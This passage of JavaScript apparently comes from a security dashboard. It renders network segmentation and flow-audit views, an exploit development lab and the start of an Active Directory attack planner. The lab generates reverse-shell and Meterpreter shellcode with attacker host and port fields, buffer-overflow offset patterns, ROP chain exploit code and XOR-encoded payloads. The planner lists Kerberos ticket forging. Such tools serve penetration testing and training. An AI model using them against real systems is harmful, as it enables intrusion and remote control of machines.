        '<div class="ag-stat"><div class="ag-stat-v" style="color:' + (openCells ? '#ff1744' : '#00e676') + '">' + openCells + '</div><div class="ag-stat-l">Open (Any-Any) Paths</div></div>' +
        '<div class="ag-stat"><div class="ag-stat-v" style="color:' + (violations.length ? '#ff9100' : '#00e676') + '">' + violations.length + '</div><div class="ag-stat-l">Flow Violations</div></div>' +
      '</div>' +
      '<div class="ag-panel">' +
        '<div class="ag-panel-h"><span style="color:var(--acc)">SEGMENTATION REACHABILITY MATRIX</span><span style="flex:1"></span><span style="color:var(--mut)">source (rows) &rarr; destination (cols)</span></div>' +
        '<div class="ag-panel-b" style="overflow-x:auto">' +
          '<table class="ag-seg-tbl"><thead><tr><th class="ag-seg-rowh">FROM \\ TO</th>' +
          dstZones.map(function (z) { return '<th>' + esc(z.name) + '</th>'; }).join('') + '</tr></thead><tbody>' +
          matrix.map(function (row) {
            return '<tr><td class="ag-seg-rowh">' + esc(row.zone.name) + '</td>' +
              row.cells.map(function (cp) { return '<td><div class="ag-seg-cell" style="background:' + cp.bg + ';color:' + cp.fg + '">' + cp.v + (cp.n > 1 ? '<br><span style="font-size:.44rem;opacity:.7">x' + cp.n + '</span>' : '') + '</div></td>'; }).join('') +
            '</tr>';
          }).join('') +
          '</tbody></table>' +
          '<div style="margin-top:8px;font-size:.6rem;color:var(--mut)"><span style="color:#00e676">ALLOW</span> specific rule &middot; <span style="color:#ff1744">OPEN</span> permitted only by broad any-any rule &middot; <span style="color:#ff9100">DENY</span> explicit block &middot; - no path</div>' +
        '</div>' +
      '</div>' +
      '<div class="ag-panel">' +
        '<div class="ag-panel-h"><span style="color:var(--acc)">ZONE INVENTORY</span></div>' +
        '<div class="ag-panel-b"><table class="ag-tbl"><thead><tr><th>Zone</th><th>CIDR</th><th>Purpose</th><th>Assets</th><th>Members</th></tr></thead><tbody>' +
          zones.filter(function (z) { return z.id !== 'ext'; }).map(function (z) {
            return '<tr><td style="color:var(--acc);font-weight:600">' + esc(z.name) + '</td><td class="ag-fw-mono" style="font-size:.62rem">' + esc(z.cidr) + '</td><td style="color:var(--mut);font-size:.66rem">' + esc(z.desc) + '</td><td class="ag-fw-mono">' + inv[z.id].length + '</td><td style="font-size:.62rem;color:var(--mut)">' + (inv[z.id].map(esc).join(', ') || '&mdash;') + '</td></tr>';
          }).join('') +
        '</tbody></table></div>' +
      '</div>' +
      '<div class="ag-panel">' +
        '<div class="ag-panel-h"><span style="color:#ff1744">SEGMENTATION VIOLATIONS (OBSERVED FLOWS)</span><span style="flex:1"></span><span style="color:var(--mut)">' + violations.length + ' of ' + NOC_CONNECTIONS.length + ' flows</span></div>' +
        '<div class="ag-panel-b">' +
          (violations.length ? '<table class="ag-tbl"><thead><tr><th>Source</th><th>From</th><th>Destination</th><th>To</th><th>Port</th><th>Policy</th><th>Reason</th></tr></thead><tbody>' +
            violations.map(function (v) {
              return '<tr style="background:rgba(255,23,68,.05)"><td class="ag-fw-mono" style="font-size:.62rem;color:' + (v.external ? '#ff1744' : 'var(--txt)') + '">' + esc(v.conn.src) + '</td><td style="color:var(--mut);font-size:.62rem">' + esc(v.za.name) + '</td>' +
                '<td class="ag-fw-mono" style="font-size:.62rem">' + esc(v.conn.dst) + '</td><td style="color:var(--mut);font-size:.62rem">' + esc(v.zb.name) + '</td><td class="ag-fw-mono">' + v.conn.port + '</td>' +
                '<td><span class="ag-badge ' + (v.res.action === 'allow' ? 'ag-high' : 'ag-crit') + '">' + esc(v.res.action) + '</span></td><td style="color:var(--mut);font-size:.64rem">' + esc(v.reason) + '</td></tr>';
            }).join('') + '</tbody></table>' : '<div style="color:var(--mut);font-size:.72rem">No segmentation violations in observed flows.</div>') +
        '</div>' +
      '</div>';
  }

  // ========== FLOW AUDIT / TRAFFIC ANALYTICS ==========
  function renderFlowAudit(c) {
    var portRisk = {};
    PORT_REFERENCE.forEach(function (p) { portRisk[p.port] = p; });
    var rows = NOC_CONNECTIONS.map(function (conn) {
      var res = fwSimulate({ src: conn.src, dst: conn.dst, proto: fwTransport(conn.port, conn.proto), port: conn.port });
      var external = fwZoneOf(conn.src).id === 'ext';
      var pr = portRisk[conn.port];
      var risk = pr ? pr.risk : 'Low';
      var broadOnly = res.matched && res.rule.action === 'allow' && fwParseCidr(res.rule.src).any && fwParseCidr(res.rule.dst).any;
      var suspectState = conn.state === 'SYN_RECV' || conn.state === 'SYN_SENT';
      var flags = [];
      if (external) flags.push('EXT');
      if (broadOnly) flags.push('BROAD');
      if (risk === 'High' || risk === 'Critical') flags.push('RISKY-PORT');
      if (suspectState) flags.push('HALF-OPEN');
      return { conn: conn, res: res, external: external, risk: risk, broadOnly: broadOnly, flags: flags };
    });
    var allowed = rows.filter(function (r) { return r.res.action === 'allow'; }).length;
    var denied = rows.length - allowed;
    var ext = rows.filter(function (r) { return r.external; }).length;
    var riskyPort = rows.filter(function (r) { return r.risk === 'High' || r.risk === 'Critical'; }).length;
    var broad = rows.filter(function (r) { return r.broadOnly; }).length;
    var flagged = rows.filter(function (r) { return r.flags.length; });
    // Protocol distribution
    var byProto = {};
    rows.forEach(function (r) { byProto[r.conn.proto] = (byProto[r.conn.proto] || 0) + 1; });
    var protoList = Object.keys(byProto).sort(function (a, b) { return byProto[b] - byProto[a]; });
    // Top talkers by bytes
    var talkers = rows.slice().sort(function (a, b) { return b.conn.bytes - a.conn.bytes; }).slice(0, 5);
    var totalBytes = rows.reduce(function (s, r) { return s + r.conn.bytes; }, 0);

    c.innerHTML =
      '<div class="ag-grid4" style="margin-bottom:10px">' +
        '<div class="ag-stat"><div class="ag-stat-v" style="color:var(--acc)">' + rows.length + '</div><div class="ag-stat-l">Observed Flows</div></div>' +
        '<div class="ag-stat"><div class="ag-stat-v" style="color:#00e676">' + allowed + '</div><div class="ag-stat-l">Allowed by Policy</div></div>' +
        '<div class="ag-stat"><div class="ag-stat-v" style="color:' + (denied ? '#ff1744' : '#00e676') + '">' + denied + '</div><div class="ag-stat-l">Denied</div></div>' +
        '<div class="ag-stat"><div class="ag-stat-v" style="color:' + (ext ? '#ff9100' : '#00e676') + '">' + ext + '</div><div class="ag-stat-l">External Origin</div></div>' +
        '<div class="ag-stat"><div class="ag-stat-v" style="color:' + (riskyPort ? '#ff9100' : '#00e676') + '">' + riskyPort + '</div><div class="ag-stat-l">Risky Ports</div></div>' +
        '<div class="ag-stat"><div class="ag-stat-v" style="color:' + (broad ? '#ff1744' : '#00e676') + '">' + broad + '</div><div class="ag-stat-l">Broad-Rule Permitted</div></div>' +
      '</div>' +
      '<div class="ag-grid2">' +
        '<div class="ag-panel"><div class="ag-panel-h"><span style="color:var(--acc)">PROTOCOL DISTRIBUTION</span></div><div class="ag-panel-b">' +
          protoList.map(function (p) {
            var pct = Math.round((byProto[p] / rows.length) * 100);
            return '<div style="margin-bottom:6px"><div style="display:flex;justify-content:space-between;font-size:.66rem"><span>' + esc(p) + '</span><span style="color:var(--mut)">' + byProto[p] + ' (' + pct + '%)</span></div><div class="ag-health-bar"><div class="ag-health-fill" style="width:' + pct + '%;background:var(--acc)"></div></div></div>';
          }).join('') +
        '</div></div>' +
        '<div class="ag-panel"><div class="ag-panel-h"><span style="color:var(--acc)">TOP TALKERS (BY VOLUME)</span></div><div class="ag-panel-b">' +
          talkers.map(function (t) {
            var pct = totalBytes ? Math.round((t.conn.bytes / totalBytes) * 100) : 0;
            return '<div style="margin-bottom:6px"><div style="display:flex;justify-content:space-between;font-size:.64rem"><span class="ag-fw-mono">' + esc(t.conn.src) + ' &rarr; ' + esc(t.conn.dst) + '</span><span style="color:var(--mut)">' + (t.conn.bytes > 1000000 ? (t.conn.bytes / 1000000).toFixed(1) + ' MB' : (t.conn.bytes / 1000).toFixed(0) + ' KB') + '</span></div><div class="ag-health-bar"><div class="ag-health-fill" style="width:' + pct + '%;background:#ffd600"></div></div></div>';
          }).join('') +
        '</div></div>' +
      '</div>' +
      '<div class="ag-panel">' +
        '<div class="ag-panel-h"><span style="color:var(--acc)">FLOW AUDIT</span><span style="flex:1"></span>' +
          '<button class="ag-btn ag-btn-ghost" id="ag-fw-graph" style="padding:3px 10px">PUSH FLAGGED TO GRAPH</button>' +
          '<span id="ag-fw-graphmsg" style="color:var(--mut);font-size:.62rem;margin-left:8px"></span></div>' +
        '<div class="ag-panel-b" style="overflow-x:auto"><table class="ag-tbl"><thead><tr><th>Source</th><th>Destination</th><th>Proto</th><th>Port</th><th>Port Risk</th><th>Policy</th><th>Matched Rule</th><th>Flags</th></tr></thead><tbody>' +
          rows.map(function (r) {
            return '<tr style="' + (r.flags.length ? 'background:rgba(255,145,0,.05)' : '') + '">' +
              '<td class="ag-fw-mono" style="font-size:.62rem;color:' + (r.external ? '#ff1744' : 'var(--txt)') + '">' + esc(r.conn.src) + '</td>' +
              '<td class="ag-fw-mono" style="font-size:.62rem">' + esc(r.conn.dst) + '</td>' +
              '<td style="color:var(--acc)">' + esc(r.conn.proto) + '</td>' +
              '<td class="ag-fw-mono">' + r.conn.port + '</td>' +
              '<td><span class="ag-badge ' + fwSevCls(r.risk) + '">' + esc(r.risk) + '</span></td>' +
              '<td><span class="ag-badge ' + (r.res.action === 'allow' ? 'ag-low' : 'ag-crit') + '">' + esc(r.res.action) + '</span></td>' +
              '<td style="font-size:.62rem;color:var(--mut)">' + (r.res.matched ? '#' + r.res.rule.seq + ' ' + esc(r.res.rule.name) : 'implicit deny') + '</td>' +
              '<td>' + (r.flags.length ? r.flags.map(function (f) { return '<span class="ag-badge ' + (f === 'BROAD' || f === 'EXT' ? 'ag-crit' : f === 'RISKY-PORT' ? 'ag-high' : 'ag-med') + '">' + f + '</span>'; }).join(' ') : '<span class="ag-badge ag-low">CLEAN</span>') + '</td>' +
            '</tr>';
          }).join('') +
        '</tbody></table></div>' +
      '</div>';

    var graphBtn = c.querySelector('#ag-fw-graph');
    if (graphBtn) graphBtn.onclick = function () {
      var msg = c.querySelector('#ag-fw-graphmsg');
      if (!flagged.length) { if (msg) msg.textContent = 'No flagged flows to push.'; return; }
      var items = flagged.map(function (r) {
        return { type: 'FINDING', name: 'Suspect flow ' + r.conn.src + ' -> ' + r.conn.dst + ':' + r.conn.port + ' (' + r.flags.join('/') + ')',
          data: { src: r.conn.src, dst: r.conn.dst, port: r.conn.port, proto: r.conn.proto, policy: r.res.action, flags: r.flags.join(',') },
          opts: { tags: ['aegis', 'firewall', 'flow'], severity: (r.external || r.broadOnly) ? 'high' : 'medium' } };
      });
      if (msg) msg.textContent = 'Pushing ' + items.length + ' flagged flow(s)...';
      import('/js/graph-bridge.js?v=20260923c').then(function (gb) {
        try { gb.sendToGraph('AEGIS', items, undefined, true); if (msg) msg.textContent = items.length + ' flow(s) sent to Security Graph.'; }
        catch (_) { if (msg) msg.textContent = 'Graph unavailable.'; }
      }).catch(function () { if (msg) msg.textContent = 'Graph unavailable.'; });
    };
  }

  // ========== EXPLOIT DEVELOPMENT LAB ==========
  function renderExploitLab(c) {
    var expTab = 'shellcode';
    c.innerHTML =
      '<div style="display:flex;gap:4px;margin-bottom:10px;flex-wrap:wrap">' +
        ['shellcode:Shellcode Generator','bof:Buffer Overflow','rop:ROP Chain Builder','encoder:Payload Encoder'].map(function(t) {
          var p = t.split(':');
          return '<button class="ag-btn' + (expTab === p[0] ? '' : ' ag-btn-ghost') + '" data-et="' + p[0] + '">' + p[1] + '</button>';
        }).join('') +
      '</div>' +
      '<div id="ag-expcontent"></div>';

    function renderExpContent(tab) {
      var ec = c.querySelector('#ag-expcontent');
      if (tab === 'shellcode') {
        ec.innerHTML =
          '<div class="ag-panel">' +
            '<div class="ag-panel-h"><span style="color:var(--acc)">SHELLCODE GENERATOR</span></div>' +
            '<div class="ag-panel-b">' +
              '<div class="ag-grid3" style="margin-bottom:10px">' +
                '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Architecture</label>' +
                  '<select class="ag-sel" id="ag-scarch" style="width:100%"><option>x86</option><option>x64</option><option>ARM</option></select></div>' +
                '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Payload Type</label>' +
                  '<select class="ag-sel" id="ag-sctype" style="width:100%"><option>Reverse TCP Shell</option><option>Bind TCP Shell</option><option>Execute Command</option><option>Meterpreter Staged</option><option>Windows Reverse TCP</option></select></div>' +
                '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Output Format</label>' +
                  '<select class="ag-sel" id="ag-scfmt" style="width:100%"><option>C Array</option><option>Python</option><option>Raw Hex</option><option>PowerShell</option><option>Bash</option></select></div>' +
              '</div>' +
              '<div class="ag-grid2" style="margin-bottom:10px">' +
                '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">LHOST</label><input class="ag-inp" id="ag-sclhost" value="10.0.0.1"></div>' +
                '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">LPORT</label><input class="ag-inp" id="ag-sclport" value="4444"></div>' +
              '</div>' +
              '<button class="ag-btn" id="ag-scgen">GENERATE SHELLCODE</button>' +
              '<div id="ag-scresult" style="margin-top:10px"></div>' +
            '</div>' +
          '</div>' +
          '<div class="ag-panel" style="margin-top:10px">' +
            '<div class="ag-panel-h"><span style="color:var(--acc)">SHELLCODE TEMPLATES</span><span style="flex:1"></span><span style="color:var(--mut)">' + Object.keys(SHELLCODE_TEMPLATES).length + ' templates</span></div>' +
            '<div class="ag-panel-b">' +
              '<table class="ag-tbl"><thead><tr><th>Template</th><th>Arch</th><th>Type</th><th>Size</th><th>Bad Chars</th><th>Description</th></tr></thead><tbody>' +
              Object.keys(SHELLCODE_TEMPLATES).map(function(key) {
                var sc = SHELLCODE_TEMPLATES[key];
                return '<tr><td style="color:var(--acc);font-weight:600;font-size:.65rem">' + esc(key) + '</td><td>' + esc(sc.arch) + '</td><td style="font-size:.65rem">' + esc(sc.type) + '</td><td style="font-variant-numeric:tabular-nums">' + sc.size + ' bytes</td><td style="color:#ff1744;font-size:.62rem">' + esc(sc.badchars) + '</td><td style="font-size:.62rem;color:var(--mut)">' + esc(sc.desc) + '</td></tr>';
              }).join('') +
              '</tbody></table>' +
            '</div>' +
          '</div>';

        ec.querySelector('#ag-scgen').onclick = function() {
          var arch = ec.querySelector('#ag-scarch').value;
          var type = ec.querySelector('#ag-sctype').value;
          var fmt = ec.querySelector('#ag-scfmt').value;
          var lhost = ec.querySelector('#ag-sclhost').value;
          var lport = ec.querySelector('#ag-sclport').value;
          // Find matching template
          var key = Object.keys(SHELLCODE_TEMPLATES).find(function(k) {
            var sc = SHELLCODE_TEMPLATES[k];
            return sc.arch.toLowerCase() === arch.toLowerCase() && sc.type.toLowerCase().indexOf(type.split(' ')[0].toLowerCase()) >= 0;
          }) || Object.keys(SHELLCODE_TEMPLATES)[0];
          var sc = SHELLCODE_TEMPLATES[key];
          var rawHex = sc.code;

          // Format output
          var output = '';
          if (fmt === 'C Array') {
            output = '// ' + sc.desc + '\n';
            output += '// Arch: ' + sc.arch + ' | Size: ' + sc.size + ' bytes | LHOST: ' + lhost + ' | LPORT: ' + lport + '\n';
            output += 'unsigned char shellcode[] = \n    "' + rawHex + '";';
          } else if (fmt === 'Python') {
            output = '# ' + sc.desc + '\n';
            output += '# Arch: ' + sc.arch + ' | Size: ' + sc.size + ' bytes | LHOST: ' + lhost + ' | LPORT: ' + lport + '\n';
            output += 'shellcode = b"' + rawHex + '"';
          } else if (fmt === 'Raw Hex') {
            output = rawHex.replace(/\\x/g, '');
          } else if (fmt === 'PowerShell') {
            output = '# ' + sc.desc + '\n';
            output += '[Byte[]]$shellcode = ' + rawHex.replace(/\\x/g, '').match(/.{2}/g).map(function(b) { return '0x' + b; }).join(',');
          } else if (fmt === 'Bash') {
            output = '# ' + sc.desc + '\n';
            output += 'echo -ne "' + rawHex + '" > shellcode.bin';
          }

          ec.querySelector('#ag-scresult').innerHTML =
            '<div class="ag-panel">' +
              '<div class="ag-panel-h"><span style="color:var(--acc)">GENERATED SHELLCODE</span><span style="flex:1"></span>' +
                '<span style="color:var(--mut);font-size:.62rem">' + esc(sc.arch) + ' | ' + sc.size + ' bytes | ' + esc(sc.type) + '</span></div>' +
              '<div class="ag-panel-b">' +
                '<pre style="background:rgba(0,0,0,.3);padding:12px;border-radius:3px;font-size:.65rem;color:var(--acc);overflow-x:auto;white-space:pre-wrap;word-break:break-all">' + esc(output) + '</pre>' +
                '<div style="margin-top:8px;display:flex;gap:8px;align-items:center">' +
                  '<span style="color:var(--mut);font-size:.62rem">Bad chars: <span style="color:#ff1744">' + esc(sc.badchars) + '</span></span>' +
                  '<span style="flex:1"></span>' +
                  '<span style="color:var(--mut);font-size:.62rem">Entropy: ' + (function() { var e = 0; var f = {}; var h = rawHex.replace(/\\x/g, ''); for (var ei = 0; ei < h.length; ei++) { var ch = h[ei]; f[ch] = (f[ch] || 0) + 1; } for (var k in f) { var p = f[k] / h.length; e -= p * Math.log2(p); } return e.toFixed(2); })() + '</span>' +
                '</div>' +
              '</div>' +
            '</div>';
        };
      } else if (tab === 'bof') {
        ec.innerHTML =
          '<div class="ag-grid2">' +
            '<div class="ag-panel">' +
              '<div class="ag-panel-h"><span style="color:var(--acc)">OFFSET FINDER / PATTERN GENERATOR</span></div>' +
              '<div class="ag-panel-b">' +
                '<div style="margin-bottom:10px"><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Pattern Length</label><input class="ag-inp" id="ag-boflen" value="500" type="number"></div>' +
                '<button class="ag-btn" id="ag-bofgen" style="margin-bottom:8px">GENERATE PATTERN</button>' +
                '<pre id="ag-bofpat" style="background:rgba(0,0,0,.3);padding:8px;border-radius:3px;font-size:.6rem;color:var(--acc);overflow-x:auto;min-height:30px;word-break:break-all;white-space:pre-wrap"></pre>' +
                '<div style="margin-top:12px"><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">EIP Value (hex)</label><input class="ag-inp" id="ag-bofeip" placeholder="e.g. 41386241"></div>' +
                '<button class="ag-btn" id="ag-boffind" style="margin-top:8px">FIND OFFSET</button>' +
                '<div id="ag-bofoffset" style="margin-top:8px"></div>' +
              '</div>' +
            '</div>' +
            '<div class="ag-panel">' +
              '<div class="ag-panel-h"><span style="color:var(--acc)">BAD CHARACTER ANALYSIS</span></div>' +
              '<div class="ag-panel-b">' +
                '<p style="font-size:.68rem;color:var(--mut);margin:0 0 8px">Generate a byte array to identify bad characters. Compare the dump in the debugger to find filtered/modified bytes.</p>' +
                '<div style="margin-bottom:8px"><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Exclude Chars (hex, comma-separated)</label><input class="ag-inp" id="ag-badexcl" value="00" placeholder="00,0a,0d"></div>' +
                '<button class="ag-btn" id="ag-badgen">GENERATE BAD CHAR ARRAY</button>' +
                '<pre id="ag-badout" style="background:rgba(0,0,0,.3);padding:8px;border-radius:3px;font-size:.6rem;color:#00e676;overflow-x:auto;margin-top:8px;min-height:30px;word-break:break-all;white-space:pre-wrap"></pre>' +
              '</div>' +
            '</div>' +
          '</div>';

        ec.querySelector('#ag-bofgen').onclick = function() {
          var len = parseInt(ec.querySelector('#ag-boflen').value) || 500;
          var pattern = '';
          var upper = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
          var lower = 'abcdefghijklmnopqrstuvwxyz';
          var nums = '0123456789';
          var idx = 0;
          for (var u = 0; u < upper.length && idx < len; u++) {
            for (var l = 0; l < lower.length && idx < len; l++) {
              for (var n = 0; n < nums.length && idx < len; n++) {
                pattern += upper[u] + lower[l] + nums[n];
                idx += 3;
              }
            }
          }
          ec.querySelector('#ag-bofpat').textContent = pattern.substring(0, len);
        };

        ec.querySelector('#ag-boffind').onclick = function() {
          var eip = ec.querySelector('#ag-bofeip').value.trim();
          if (!eip) return;
          // Reverse byte order for little-endian
          var bytes = eip.match(/.{2}/g);
          if (!bytes || bytes.length !== 4) {
            ec.querySelector('#ag-bofoffset').innerHTML = '<div style="color:#ff1744;font-size:.72rem">Enter a 4-byte hex value (8 characters)</div>';
            return;
          }
          var reversed = bytes.reverse().map(function(b) { return String.fromCharCode(parseInt(b, 16)); }).join('');
          var pattern = ec.querySelector('#ag-bofpat').textContent;
          var offset = pattern.indexOf(reversed);
          ec.querySelector('#ag-bofoffset').innerHTML =
            '<div style="font-size:.72rem">' +
            (offset >= 0 ?
              '<span style="color:#00e676;font-weight:700">Offset found at position: ' + offset + '</span>' +
              '<div style="color:var(--mut);font-size:.65rem;margin-top:4px">EIP overwrite: buffer[' + offset + ':' + (offset+4) + ']</div>' +
              '<div style="color:var(--mut);font-size:.65rem">Payload structure: [JUNK x ' + offset + '] + [EIP] + [NOP sled] + [shellcode]</div>' :
              '<span style="color:#ff1744">Pattern not found. Regenerate with a longer pattern.</span>') +
            '</div>';
        };

        ec.querySelector('#ag-badgen').onclick = function() {
          var exclude = ec.querySelector('#ag-badexcl').value.split(',').map(function(h) { return parseInt(h.trim(), 16); });
          var arr = [];
          for (var i = 0; i < 256; i++) {
            if (exclude.indexOf(i) < 0) arr.push('\\x' + i.toString(16).padStart(2, '0'));
          }
          ec.querySelector('#ag-badout').textContent = 'badchars = b"' + arr.join('') + '"\n\n# Length: ' + arr.length + ' bytes\n# Excluded: \\x' + exclude.map(function(e) { return e.toString(16).padStart(2,'0'); }).join(' \\x');
        };
      } else if (tab === 'rop') {
        ec.innerHTML =
          '<div class="ag-panel">' +
            '<div class="ag-panel-h"><span style="color:var(--acc)">ROP CHAIN BUILDER</span><span style="flex:1"></span><span style="color:var(--mut)">' + ROP_GADGETS.length + ' gadgets</span></div>' +
            '<div class="ag-panel-b">' +
              '<p style="font-size:.68rem;color:var(--mut);margin:0 0 10px">Select gadgets to build a ROP chain. Drag to reorder. The chain builder generates exploit code for the selected sequence.</p>' +
              '<table class="ag-tbl"><thead><tr><th>Select</th><th>Address</th><th>Gadget</th><th>Description</th><th>Use Case</th></tr></thead><tbody>' +
              ROP_GADGETS.map(function(g, i) {
                return '<tr><td><input type="checkbox" data-rop="' + i + '"></td><td style="color:var(--acc);font-family:inherit;font-size:.65rem">' + esc(g.addr) + '</td><td style="font-weight:600;font-size:.68rem;color:#00e676">' + esc(g.gadget) + '</td><td style="font-size:.62rem;color:var(--mut)">' + esc(g.desc) + '</td><td style="font-size:.62rem">' + esc(g.use) + '</td></tr>';
              }).join('') +
              '</tbody></table>' +
              '<button class="ag-btn" id="ag-ropbuild" style="margin-top:10px">BUILD ROP CHAIN</button>' +
              '<div id="ag-ropout" style="margin-top:10px"></div>' +
            '</div>' +
          '</div>';

        ec.querySelector('#ag-ropbuild').onclick = function() {
          var selected = [];
          ec.querySelectorAll('[data-rop]:checked').forEach(function(cb) {
            selected.push(ROP_GADGETS[parseInt(cb.dataset.rop)]);
          });
          if (selected.length === 0) {
            ec.querySelector('#ag-ropout').innerHTML = '<div style="color:#ff1744;font-size:.72rem">Select at least one gadget</div>';
            return;
          }
          var chain = '# ROP Chain - ' + selected.length + ' gadgets\n';
          chain += '# Generated by AEGIS Exploit Development Lab\n\n';
          chain += 'from struct import pack\n\n';
          chain += 'rop_chain = b""\n';
          selected.forEach(function(g) {
            chain += 'rop_chain += pack("<Q", ' + g.addr + ')  # ' + g.gadget + '\n';
          });
          chain += '\n# Total chain size: ' + (selected.length * 8) + ' bytes';
          ec.querySelector('#ag-ropout').innerHTML =
            '<div class="ag-panel"><div class="ag-panel-h"><span style="color:var(--acc)">GENERATED ROP CHAIN</span></div><div class="ag-panel-b">' +
            '<pre style="background:rgba(0,0,0,.3);padding:12px;border-radius:3px;font-size:.65rem;color:var(--acc);overflow-x:auto;white-space:pre-wrap">' + esc(chain) + '</pre></div></div>';
        };
      } else if (tab === 'encoder') {
        ec.innerHTML =
          '<div class="ag-panel">' +
            '<div class="ag-panel-h"><span style="color:var(--acc)">PAYLOAD ENCODER</span></div>' +
            '<div class="ag-panel-b">' +
              '<textarea class="ag-textarea" id="ag-encpayload" placeholder="Enter raw payload (hex bytes, e.g. \\x31\\xc0\\x50...)" rows="4"></textarea>' +
              '<div class="ag-grid3" style="margin-top:8px;margin-bottom:8px">' +
                '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Encoding Method</label>' +
                  '<select class="ag-sel" id="ag-encmethod" style="width:100%"><option>XOR (single byte)</option><option>XOR (rolling key)</option><option>Base64</option><option>Alpha-numeric</option><option>Unicode</option></select></div>' +
                '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">XOR Key (hex)</label>' +
                  '<input class="ag-inp" id="ag-enckey" value="41"></div>' +
                '<div><label style="font-size:.62rem;color:var(--mut);text-transform:uppercase">Iterations</label>' +
                  '<input class="ag-inp" id="ag-enciter" value="1" type="number"></div>' +
              '</div>' +
              '<button class="ag-btn" id="ag-encgo">ENCODE PAYLOAD</button>' +
              '<div id="ag-encresult" style="margin-top:10px"></div>' +
            '</div>' +
          '</div>';

        ec.querySelector('#ag-encgo').onclick = function() {
          var payload = ec.querySelector('#ag-encpayload').value.trim();
          var method = ec.querySelector('#ag-encmethod').value;
          var key = parseInt(ec.querySelector('#ag-enckey').value, 16) || 0x41;
          var iterations = parseInt(ec.querySelector('#ag-enciter').value) || 1;
          if (!payload) return;

          // Extract bytes
          var bytes = [];
          var matches = payload.match(/\\x[0-9a-fA-F]{2}/g);
          if (matches) {
            bytes = matches.map(function(m) { return parseInt(m.slice(2), 16); });
          } else {
            bytes = payload.match(/[0-9a-fA-F]{2}/g);
            if (bytes) bytes = bytes.map(function(h) { return parseInt(h, 16); });
            else bytes = Array.from(new TextEncoder().encode(payload));
          }

          var encoded = bytes.slice();
          for (var iter = 0; iter < iterations; iter++) {
            if (method.indexOf('XOR') >= 0) {
              encoded = encoded.map(function(b, i) {
                if (method.indexOf('rolling') >= 0) return b ^ ((key + i) & 0xFF);
                return b ^ key;
              });
            } else if (method === 'Base64') {
              var str = String.fromCharCode.apply(null, encoded);
              encoded = Array.from(new TextEncoder().encode(btoa(str)));
            }
          }

          var origEntropy = calcEntropy(bytes);
          var encEntropy = calcEntropy(encoded);
          var result = encoded.map(function(b) { return '\\x' + b.toString(16).padStart(2, '0'); }).join('');

          ec.querySelector('#ag-encresult').innerHTML =
            '<div class="ag-panel"><div class="ag-panel-h"><span style="color:var(--acc)">ENCODED PAYLOAD</span></div><div class="ag-panel-b">' +
            '<pre style="background:rgba(0,0,0,.3);padding:12px;border-radius:3px;font-size:.65rem;color:#00e676;overflow-x:auto;white-space:pre-wrap;word-break:break-all">' + esc(result) + '</pre>' +
            '<div class="ag-grid4" style="margin-top:8px">' +
              '<div class="ag-stat"><div class="ag-stat-v" style="color:var(--acc);font-size:1rem">' + bytes.length + '</div><div class="ag-stat-l">Original Size</div></div>' +
              '<div class="ag-stat"><div class="ag-stat-v" style="color:#00e676;font-size:1rem">' + encoded.length + '</div><div class="ag-stat-l">Encoded Size</div></div>' +
              '<div class="ag-stat"><div class="ag-stat-v" style="color:#ffd600;font-size:1rem">' + origEntropy.toFixed(2) + '</div><div class="ag-stat-l">Orig Entropy</div></div>' +
              '<div class="ag-stat"><div class="ag-stat-v" style="color:#d500f9;font-size:1rem">' + encEntropy.toFixed(2) + '</div><div class="ag-stat-l">Enc Entropy</div></div>' +
            '</div>' +
            '</div></div>';
        };
      }
    }
    renderExpContent(expTab);
    c.querySelectorAll('[data-et]').forEach(function(b) {
      b.onclick = function() {
        expTab = b.dataset.et;
        c.querySelectorAll('[data-et]').forEach(function(x) { x.classList.toggle('ag-btn-ghost', x.dataset.et !== expTab); });
        renderExpContent(expTab);
      };
    });
  }

  function calcEntropy(bytes) {
    if (!bytes || bytes.length === 0) return 0;
    var freq = {};
    bytes.forEach(function(b) { freq[b] = (freq[b] || 0) + 1; });
    var entropy = 0;
    var len = bytes.length;
    for (var k in freq) {
      var p = freq[k] / len;
      entropy -= p * Math.log2(p);
    }
    return entropy;
  }

  // ========== ACTIVE DIRECTORY ATTACK PLANNER ==========
  function renderADPlanner(c) {
    var adTab = 'enum';
    c.innerHTML =
      '<div style="display:flex;gap:4px;margin-bottom:10px;flex-wrap:wrap">' +
        ['enum:Domain Enumeration','paths:Attack Paths','attacks:AD Attacks','kerberos:Kerberos Forge','ldap:LDAP Builder'].map(function(t) {
          var p = t.split(':');
          return '<button class="ag-btn' + (adTab === p[0] ? '' : ' ag-btn-ghost') + '" data-ad="' + p[0] + '">' + p[1] + '</button>';
        }).join('') +
      '</div>' +
      '<div id="ag-adcontent"></div>';

    function renderADContent(tab) {
      var ac = c.querySelector('#ag-adcontent');
      if (tab === 'enum') {
        ac.innerHTML =
          '<div class="ag-panel">' +
            '<div class="ag-panel-h"><span style="color:var(--acc)">DOMAIN ENUMERATION - CORP.LOCAL</span><span style="flex:1"></span><span style="color:var(--mut)">' + AD_SIM_USERS.length + ' accounts</span></div>' +
            '<div class="ag-panel-b">' +
              '<div class="ag-grid4" style="margin-bottom:10px">' +
                '<div class="ag-stat"><div class="ag-stat-v" style="color:var(--acc);font-size:1rem">' + AD_SIM_USERS.length + '</div><div class="ag-stat-l">Users</div></div>' +
                '<div class="ag-stat"><div class="ag-stat-v" style="color:#ff1744;font-size:1rem">' + AD_SIM_USERS.filter(function(u){return u.groups.indexOf('Domain Admins')>=0}).length + '</div><div class="ag-stat-l">Domain Admins</div></div>' +
                '<div class="ag-stat"><div class="ag-stat-v" style="color:#ff9100;font-size:1rem">' + AD_SIM_USERS.filter(function(u){return u.spn}).length + '</div><div class="ag-stat-l">SPN Accounts</div></div>' +
                '<div class="ag-stat"><div class="ag-stat-v" style="color:#ffd600;font-size:1rem">' + AD_SIM_USERS.filter(function(u){return u.asrep}).length + '</div><div class="ag-stat-l">AS-REP Vuln</div></div>' +
              '</div>' +
